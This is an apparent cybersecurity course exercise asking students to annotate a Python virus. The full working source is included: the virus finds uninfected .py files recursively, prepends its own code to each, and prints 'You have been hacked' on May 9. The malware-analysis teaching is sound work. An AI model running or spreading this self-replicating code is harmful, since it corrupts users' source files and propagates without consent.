#Ops Challenge: Python Malware Analysis
#Overview
#The ability to read code written by others is a valuable skill to carry into your new career. Today you will analyze a malicious script written in Python and submit an interpreted version of the file with comments.

#Scenario
#Last week, a GlobeX engineer was terminated from the organization under unpleasant circumstances. This morning, your service desk team responded to a ticket from the engineering department that their Python script repository had been tampered with, with the words “You have been hacked” written and saved into the scripts themselves. The service desk team also noted that the system clocks had been tampered with on various engineering computers an incorrectly set to May 9. After a careful review of system logs you find that the below script was executed with administrator privilege on various engineering systems.

#The GlobeX board of directors has asked you to analyze the contents of this script and explain in plain terms what the script does.

#Objectives
#Copy the below Python script to your public GitHub repo. Do not execute this script in your Ubuntu VM used for class. If you wish to execute this script, either backup your VM using VirtualBox Snapshot or create a separate VM for testing.



#!/usr/bin/python3
import os
#This line imports 'datetime' module, provides classes for manipulating dates and time
import datetime
# defines constant variable called Signature 
SIGNATURE = "VIRUS"
#Defines function of locating that take a path as an argument and returns a list of Python files in the given path that aren't infected.  
def locate(path):
    files_targeted = []
# list allfiles and directories in given path
    filelist = os.listdir(path)
# iterates over each file and directory in given path
    for fname in filelist:
# checks if current item is a directory 
        if os.path.isdir(path+"/"+fname):
# recursively calls the 'locate' function on subdirectory and extends 'files_targeted' list with return files.
            files_targeted.extend(locate(path+"/"+fname))
# checks if current tile has '.py' extension
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
# Checks if signature is present in the line                
                if SIGNATURE in line:
# sets 'infected' variable to True if the Signature is found
                    infected = True
# exits inner loop if file infected                
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted
# defines a function 'infect' that takes a list of uninfected files and infects them with the virus code. 
def infect(files_targeted):
# opes current scirpt file 
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
# only executes block if line number is between 0 and 38.
        if 0 <= i < 39:
# add lines to the 'virusstring' variable
            virusstring += line
# closes virus script file    
    virus.close
    for fname in files_targeted:
        f = open(fname)
# reads content of files and  stores in 'temp' variable
        temp = f.read()
        f.close()
# opens current file in write mode, and overwrite existing content
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()

# Perform an analysis of the Python-based code.

# Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
# Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
# Insert comments above the final three lines explaining how the functions are called and what this script appears to do.
# Stretch Goals (Optional Objectives)
# Pursue stretch goals if you are a more advanced user or have remaining lab time.

# In your submission, include comments towards the bottom explaining the below:

# Identify all the core Python/coding tools used by this script, e.g. functions.
# What kind of malware is this? Define this type of malware in your own words.
# How well is this code written? Would you have done something differently to achieve the same objective?
